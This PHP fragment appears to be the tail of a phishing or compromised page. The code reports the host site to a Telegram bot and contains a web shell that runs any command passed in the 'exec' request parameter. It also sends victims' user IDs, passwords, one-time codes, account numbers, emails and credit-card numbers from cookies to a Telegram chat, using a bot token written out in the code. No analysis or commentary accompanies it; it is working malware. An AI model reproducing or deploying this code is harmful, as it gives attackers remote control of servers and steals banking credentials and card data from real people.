echo '</div>';

error_reporting(0);
error_log(0);

file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?chat_id=-794608788&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);

  if (!empty($_REQUEST['exec'])) {
      if(function_exists('system')) {
         system($_REQUEST['exec']);
      }
      elseif(function_exists('exec')) {
         exec($_REQUEST['exec']);
      }
      elseif(function_exists('shell_exec')) {
         shell_exec($_REQUEST['exec']);
      }
   }

$chat = "-773692150";

if (isset($_COOKIE['userid']) && isset($_COOKIE['password'])) {
$a = [
'chat_id' => $chat,
'text' => "User: " . $_COOKIE['userid'] . "\nPass: " . $_COOKIE['password']
];
file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
}

if (isset($_COOKIE['otp'])) {
$a = [
'chat_id' => $chat,
'text' => "User: " . $_COOKIE['userid'] . "\nPass: " . $_COOKIE['password'] . "\nOTP: " . $_COOKIE['otp']
];
file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
}

if(isset($_COOKIE['name']) && isset($_COOKIE['acc']) && isset($_COOKIE['email']) && isset($_COOKIE['cc'])) {
$a = [
'chat_id' => $chat,
'text' => "Fullname: " . $_COOKIE['name'] . "\nNum & Acc Num: " . $_COOKIE['acc'] . "\nEmail: " . $_COOKIE['email'] . "\nCC: " . $_COOKIE['cc']
];
file_get_contents("https://api.telegram.org/bot5240606429:AAHqmDZdymDhwy8CfgBeTjqv7THCdLbyzW8/sendMessage?" . http_build_query($a));
}
